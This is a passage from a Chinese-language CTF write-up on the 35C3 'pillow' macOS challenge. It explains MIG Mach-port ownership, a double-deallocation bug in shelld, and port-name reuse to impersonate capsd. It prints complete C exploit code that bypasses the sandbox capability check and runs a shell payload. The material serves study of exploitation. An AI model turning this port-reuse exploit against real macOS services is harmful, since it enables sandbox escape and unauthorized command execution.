class="line">mach_msg_destroy(<span class="keyword">mach_msg_header_t</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_msg_bits_t</span> mbits = msg-&gt;msgh_bits;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The msgh_local_port field doesn't hold a port right.</span></span><br><span class="line"><span class="comment">     * The receive operation consumes the destination port right.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    mach_msg_destroy_port(msg-&gt;msgh_remote_port, MACH_MSGH_BITS_REMOTE(mbits));</span><br><span class="line">    mach_msg_destroy_port(msg-&gt;msgh_voucher_port, MACH_MSGH_BITS_VOUCHER(mbits));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mbits &amp; MACH_MSGH_BITS_COMPLEX) &#123;</span><br><span class="line">        <span class="keyword">mach_msg_base_t</span>         *base;</span><br><span class="line">        <span class="keyword">mach_msg_type_number_t</span>  count, i;</span><br><span class="line">        <span class="keyword">mach_msg_descriptor_t</span>   *daddr;</span><br><span class="line"></span><br><span class="line">        base = (<span class="keyword">mach_msg_base_t</span> *) msg;</span><br><span class="line">        count = base-&gt;body.msgh_descriptor_count;</span><br><span class="line"></span><br><span class="line">        daddr = (<span class="keyword">mach_msg_descriptor_t</span> *) (base + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (daddr-&gt;type.type) &#123;</span><br><span class="line">                <span class="keyword">case</span> MACH_MSG_PORT_DESCRIPTOR: &#123;</span><br><span class="line">                    <span class="comment">// 如果传入的 mach msg 中 description 类型为 PORT，则调用 mach_msg_destroy_port 将其释放</span></span><br><span class="line">                    <span class="keyword">mach_msg_port_descriptor_t</span> *dsc;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* </span></span><br><span class="line"><span class="comment">                     * Destroy port rights carried in the message </span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    dsc = &amp;daddr-&gt;port;</span><br><span class="line">                    <span class="comment">// 而 mach_msg_destroy_port 函数均会调用 mach_port_deallocate 释放该 port</span></span><br><span class="line">                    mach_msg_destroy_port(dsc-&gt;name, dsc-&gt;disposition);</span><br><span class="line">                    daddr = (<span class="keyword">mach_msg_descriptor_t</span> *)(dsc + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                [...]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这意味着：<strong>若 Server 所实现接口不返回 KERN_SUCCESS 时，libdispatch 将自动释放 client 传给 server 的 <code>listener</code> (mach port)。</strong></p>
+<p>即：<strong>如果 MIG 调用 返回成功代码，则意味着该方法获得了消息中包含的所有 mach port right 的所有权；如果 MIG 调用 返回失败代码，则意味着该方法对消息中包含的 mach port right 不具有任何所有权</strong>，此时消息中包含的 mach port right 将会静默被 MIG 析构。</p>
+<h5 id="4-mach-msg-server">4) mach_msg_server*</h5>
+<p>除了 libdispatch 以外，其他用于 MIG 的 <code>mach_msg_server</code> 和 <code>mach_msg_server_once</code> 函数同样遵循该规则：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">mach_msg_server(</span><br><span class="line">    <span class="keyword">boolean_t</span> (*demux)(<span class="keyword">mach_msg_header_t</span> *, <span class="keyword">mach_msg_header_t</span> *),</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span> max_size,</span><br><span class="line">    <span class="keyword">mach_port_t</span> rcv_name,</span><br><span class="line">    <span class="keyword">mach_msg_options_t</span> options)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        [...]</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取发来的信息</span></span><br><span class="line">        mr = mach_msg(&amp;bufRequest-&gt;Head, MACH_RCV_MSG|MACH_RCV_VOUCHER|options,</span><br><span class="line">                  <span class="number">0</span>, request_size, rcv_name,</span><br><span class="line">                  MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (mr == MACH_MSG_SUCCESS) &#123;</span><br><span class="line">            <span class="comment">/* we have another request message */</span></span><br><span class="line"></span><br><span class="line">            buffers_swapped = FALSE;</span><br><span class="line">            old_state = voucher_mach_msg_adopt(&amp;bufRequest-&gt;Head);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用 MIG server </span></span><br><span class="line">            (<span class="keyword">void</span>) (*demux)(&amp;bufRequest-&gt;Head, &amp;bufReply-&gt;Head);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果返回的 mach msg 不为 COMPLEX</span></span><br><span class="line">            <span class="keyword">if</span> (!(bufReply-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bufReply-&gt;RetCode == MIG_NO_REPLY)</span><br><span class="line">                    bufReply-&gt;Head.msgh_remote_port = MACH_PORT_NULL;</span><br><span class="line">                <span class="comment">// 并且 MIG 调用存在错误，同时 Client 传来的消息是 COMPLEX</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((bufReply-&gt;RetCode != KERN_SUCCESS) &amp;&amp;</span><br><span class="line">                     (bufRequest-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX)) &#123;</span><br><span class="line">                    <span class="comment">/* destroy the request - but not the reply port */</span></span><br><span class="line">                    bufRequest-&gt;Head.msgh_remote_port = MACH_PORT_NULL;</span><br><span class="line">                    <span class="comment">// 调用 mach_msg_destroy 将其析构</span></span><br><span class="line">                    mach_msg_destroy(&amp;bufRequest-&gt;Head);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            [...]</span><br><span class="line"></span><br><span class="line">        &#125; <span class="comment">/* while (mr == MACH_MSG_SUCCESS) */</span></span><br><span class="line"></span><br><span class="line">        [...]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="comment">/* for(;;) */</span></span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>)vm_deallocate(self,</span><br><span class="line">                (<span class="keyword">vm_address_t</span>) bufRequest,</span><br><span class="line">                request_alloc);</span><br><span class="line">    (<span class="keyword">void</span>)vm_deallocate(self,</span><br><span class="line">                (<span class="keyword">vm_address_t</span>) bufReply,</span><br><span class="line">                reply_alloc);</span><br><span class="line">    <span class="keyword">return</span> mr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="c-存在的问题">c. 存在的问题</h4>
+<p>那么现在回到 <code>register_completion_listern</code> 函数中，我们再来看看哪里不对劲：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">register_completion_listener</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">const</span> <span class="keyword">char</span>* session_name, <span class="keyword">mach_port_t</span> listener, <span class="keyword">audit_token_t</span> client)</span> </span>&#123;</span><br><span class="line">    CFMutableDictionaryRef session = lookup_session(session_name, client);</span><br><span class="line">    <span class="keyword">if</span> (!session) &#123;</span><br><span class="line">        mach_port_deallocate(mach_task_self(), listener);</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;listener);</span><br><span class="line">    CFDictionaryAddValue(session, CFSTR(<span class="string">"listener"</span>), value);</span><br><span class="line">    CFRelease(value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显，既然该函数要在查询不到 session 时返回 <code>KERN_FAILUE</code>，那么就<strong>不应该对 listerner 这个 mach port 进行 <code>deallocation</code> 操作</strong>，这将使得<strong>该 mach port 被 deallocate 两次</strong>，一次是该函数中，另一次是在 MIG 其他处理过程中。</p>
+<h4 id="d-接管-capsd-service-port">d. 接管 capsd_service_port</h4>
+<p>根据上面的内容我们可以了解到，<code>register_completion_listener</code> 函数可能会导致对某个 mach port 的 double deallocation。</p>
+<p>而又因为 <strong>mach port 是引用计数</strong>的，因此我们可以将 <code>capsd_service_port</code> 传给该函数，利用该函数的漏洞点，尝试二次释放掉 <code>capsd_service_port</code>。因为此时的 capsd_service_port 的引用计数为 2，二次释放将使得该 mach port 的引用计数归 0，导致该 mach port name 在当前 task 中被彻底释放。这样，该 mach port name 可被下一次创建的 mach port 所重用。</p>
+<blockquote>
+<p>shelld 中， capsd_service_port 的引用计数<strong>在执行 <code>register_completion_listener(..., capsd_service_port)</code> 时</strong>，之所以为 2，是因为：</p>
+<ol>
+<li>shelld 在 main 函数中执行 <code>bootstrap_look_up</code>，已经获取了一次 capsd_service_port 的 right</li>
+<li>执行 register_completion_listener 时，client 将再发送一次 capsd_service_port 给 server</li>
+</ol>
+<p>故 server 将在两个不同的地方持有相同的 port，引用计数为2。</p>
+</blockquote>
+<p>因此，我们便可以<strong>尝试 劫持/接管 这个被释放掉的 mach port name</strong>，对 shelld 伪造一个 “capsd”，在 shelld 进行权限查询时返回错误结果，绕过 sandbox capability check。</p>
+<p>花了点时间写了下利用，以下代码成功突破 shelld 的 sandbox capabilities check：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bootstrap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../mig/shelld.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/utils.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/decls.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造 capsd 必备函数</span></span><br><span class="line"><span class="keyword">boolean_t</span> capsd_server</span><br><span class="line">    (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">grant_capability</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">audit_token_t</span> token, <span class="keyword">pid_t</span> target, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">has_capability</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg, <span class="keyword">int</span>* out)</span> </span>&#123;</span><br><span class="line">    *out = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 bootstrap port、 shelld port 和 capsd port</span></span><br><span class="line">    <span class="keyword">mach_port_t</span> bp, sp, cp;</span><br><span class="line">    task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &amp;bp);</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bp, <span class="string">"net.saelo.shelld"</span>, &amp;sp);</span><br><span class="line">    ASSERT_SUCCESS(kr, <span class="string">"shelld bootstrap_look_up"</span>);</span><br><span class="line">    kr = bootstrap_look_up(bp, <span class="string">"net.saelo.capsd"</span>, &amp;cp);</span><br><span class="line">    ASSERT_SUCCESS(kr, <span class="string">"capsd bootstrap_look_up"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先提前准备好一个可用的 session</span></span><br><span class="line">    shelld_create_session(sp, <span class="string">"session"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 简单测试一下，肯定无法通过 capability 检测，因为 exp 没有 /bin/bash 的启动权限</span></span><br><span class="line">    kr = shell_exec(sp, <span class="string">"session"</span>, <span class="string">"echo 'Hello World'"</span>);</span><br><span class="line">    <span class="keyword">if</span>(kr != KERN_SUCCESS)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*] shell_exec faild before attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试将 shelld 中的 capsd_service_port 释放</span></span><br><span class="line">    register_completion_listener(sp, <span class="string">"non-exist-session"</span>, cp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一对新的 listener 和 listener_send_right</span></span><br><span class="line">    <span class="keyword">mach_port_t</span> listener, listener_send_right;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> aquired_right;</span><br><span class="line">    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;listener);</span><br><span class="line">    mach_port_extract_right(mach_task_self(), listener, MACH_MSG_TYPE_MAKE_SEND, &amp;listener_send_right, &amp;aquired_right);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 启动一个 伪capsd_server </span></span><br><span class="line"><span class="comment">       需要注意的是，这里必须创建新的 dispatch queue 给 listener，</span></span><br><span class="line"><span class="comment">       因为 main queue 需要调用 dispatch_main 才能使用，但我们仍然需要使用控制流，因此不能调用 dispatch_main */</span></span><br><span class="line">    <span class="keyword">dispatch_queue_main_t</span> replyQueue = dispatch_queue_create(<span class="string">"replyQueue"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, listener, <span class="number">0</span>, replyQueue);</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">        dispatch_mig_server(source, MAX_MSG_SIZE, capsd_server);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_resume(source);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试绕过 sandbox capabilities check</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> cnt = <span class="number">0</span>; cnt &lt; <span class="number">10000</span>; ++cnt) &#123;</span><br><span class="line">        register_completion_listener(sp, <span class="string">"session"</span>, listener_send_right);</span><br><span class="line">        <span class="comment">// 测试基本功能</span></span><br><span class="line">        kr = shell_exec(sp, <span class="string">"session"</span>, <span class="string">"echo 'Hello World'"</span>);</span><br><span class="line">        <span class="keyword">if</span>(kr == KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] shell_exec success! test %zu times.\n"</span>, cnt);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果无法使用，则将该 listener 从 shelld 中删除</span></span><br><span class="line">        unregister_completion_listener(sp, <span class="string">"session"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行效果如下，可以看到成功通过 capabilities check：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108224804659.png" alt="image-20220108224804659"></p>
+<p>需要注意的是，调试时，最好每次都重启一下 shelld，防止其内部旧数据影响调试。</p>
+<h2 id="五、漏洞利用">五、漏洞利用</h2>
+<p>综合上面的内容，我们最终可以拼接出一个完整 exploit：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bootstrap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../mig/shelld.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/utils.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/decls.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造 capsd 必备函数</span></span><br><span class="line"><span class="keyword">boolean_t</span> capsd_server</span><br><span class="line">    (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">grant_capability</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">audit_token_t</span> token, <span class="keyword">pid_t</span> target, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">has_capability</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg, <span class="keyword">int</span>* out)</span> </span>&#123;</span><br><span class="line">    *out = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 bootstrap port、 shelld port 和 capsd port</span></span><br><span class="line">    <span class="keyword">mach_port_t</span> bp, sp, cp;</span><br><span class="line">    task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &amp;bp);</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bp, <span class="string">"net.saelo.shelld"</span>, &amp;sp);</span><br><span class="line">    ASSERT_SUCCESS(kr, <span class="string">"shelld bootstrap_look_up"</span>);</span><br><span class="line">    kr = bootstrap_look_up(bp, <span class="string">"net.saelo.capsd"</span>, &amp;cp);</span><br><span class="line">    ASSERT_SUCCESS(kr, <span class="string">"capsd bootstrap_look_up"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先提前准备好一个可用的 session</span></span><br><span class="line">    <span class="keyword">char</span> long_session_name[<span class="number">4096</span>];</span><br><span class="line">    <span class="built_in">memset</span>(long_session_name, <span class="string">'a'</span>, <span class="keyword">sizeof</span>(long_session_name) - <span class="number">1</span>);</span><br><span class="line">    long_session_name[<span class="keyword">sizeof</span>(long_session_name) <span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">    shelld_create_session(sp, long_session_name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试将 shelld 中的 capsd_service_port 释放</span></span><br><span class="line">    register_completion_listener(sp, <span class="string">"non-exist-session"</span>, cp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一对新的 listener 和 listener_send_right</span></span><br><span class="line">    <span class="keyword">mach_port_t</span> listener, listener_send_right;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> aquired_right;</span><br><span class="line">    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;listener);</span><br><span class="line">    mach_port_extract_right(mach_task_self(), listener, MACH_MSG_TYPE_MAKE_SEND, &amp;listener_send_right, &amp;aquired_right);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 启动一个 伪capsd_server </span></span><br><span class="line"><span class="comment">       需要注意的是，这里必须创建新的 dispatch queue 给 listener，</span></span><br><span class="line"><span class="comment">       因为 main queue 需要调用 dispatch_main 才能使用，但我们仍然需要使用控制流，因此不能调用 dispatch_main */</span></span><br><span class="line">    <span class="keyword">dispatch_queue_main_t</span> replyQueue = dispatch_queue_create(<span class="string">"replyQueue"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, listener, <span class="number">0</span>, replyQueue);</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">        dispatch_mig_server(source, MAX_MSG_SIZE, capsd_server);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_resume(source);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试绕过 sandbox capabilities check</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> cnt = <span class="number">0</span>; cnt &lt; <span class="number">10000</span>; ++cnt) &#123;</span><br><span class="line">        register_completion_listener(sp, long_session_name, listener_send_right);</span><br><span class="line">        <span class="comment">// 测试基本功能</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *payload = </span><br><span class="line">            <span class="string">"chmod 777 /Users/kiprey/Desktop/CTF/35c3ctf/pillow/flag "</span></span><br><span class="line">            <span class="string">"&amp;&amp; cp /Users/kiprey/Desktop/CTF/35c3ctf/pillow/flag /tmp/pillow_flag "</span></span><br><span class="line">            <span class="string">"&amp;&amp; open -a TextEdit /tmp/pillow_flag"</span>;</span><br><span class="line">        kr = shell_exec(sp, long_session_name, payload);</span><br><span class="line">        <span class="keyword">if</span>(kr == KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] shell_exec success! test %zu times.\n"</span>, cnt);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果无法使用，则将该 listener 从 shelld 中删除</span></span><br><span class="line">        unregister_completion_listener(sp, long_session_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译参数：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CC = clang</span><br><span class="line"><span class="section">myexploit: myexploit.c</span></span><br><span class="line">    <span class="variable">$(CC)</span> -g -O0 myexploit.c ../mig/shelldUser.c ../mig/capsdServer.c  -o myexploit</span><br></pre></td></tr></table></figure>
+<p>在沙箱中执行 exploit：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">make</span><br><span class="line">sandbox-exec -f exploit.sb -D EXPLOIT_BIN=/Users/kiprey/Desktop/CTF/35c3ctf/pillow/exploit/myexploit ./myexploit</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108232108975.png" alt="image-20220108232108975"></p>
+<blockquote>
+<p>调试 exp 时，最好每次在执行 exp 前都重启一下 shelld。</p>
+</blockquote>
+<h2 id="六、参考链接">六、参考链接</h2>
+<ul>
+<li><a href="https://paper.seebug.org/1453/" target="_blank" rel="noopener">使用跨进程 XSS 逃逸 macOS Safari 沙箱 - Seebug</a></li>
+<li><a href="https://github.com/LinusHenze/35C3_Writeups/tree/master/pillow" target="_blank" rel="noopener">pillow writeup - github LinusHenze</a></li>
+<li><a href="https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf" target="_blank" rel="noopener">Don’t Trust the PID!  - @5aelo</a></li>
+<li><a href="http://newosxbook.com/files/HITSB.pdf" target="_blank" rel="noopener">Hack in the (sand)Box - Jonathan Levin</a></li>
+<li><a href="https://wiki.mozilla.org/Sandbox/OS_X_Rule_Set" target="_blank" rel="noopener">OSX Sandbox Rule Set - mozilla wiki</a></li>
+<li><a href="https://www.chungkwong.cc/scheme.html" target="_blank" rel="noopener">Scheme概览 - chungkwong</a></li>
+<li><a href="https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf" target="_blank" rel="noopener">Apple’s Sandbox Guide v1.0</a></li>
